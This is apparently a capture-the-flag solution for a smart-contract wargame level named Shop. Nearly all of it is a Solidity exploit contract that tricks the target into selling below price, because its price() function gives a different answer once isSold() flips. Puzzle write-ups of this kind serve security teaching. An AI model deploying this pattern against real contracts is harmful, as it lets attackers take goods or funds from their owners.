Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function buy() external; 
    function isSold() external view returns (bool);
    function price() external view returns (uint);
}

contract Exploit {

    function exploit (address _who) public {
        Shop(_who).buy();
    }

    function price () public view returns (uint) {
        if (Shop(msg.sender).isSold()){
            return 0;
        }
        return 1000;
    }
}
```
Call exploit() sending your contract instance
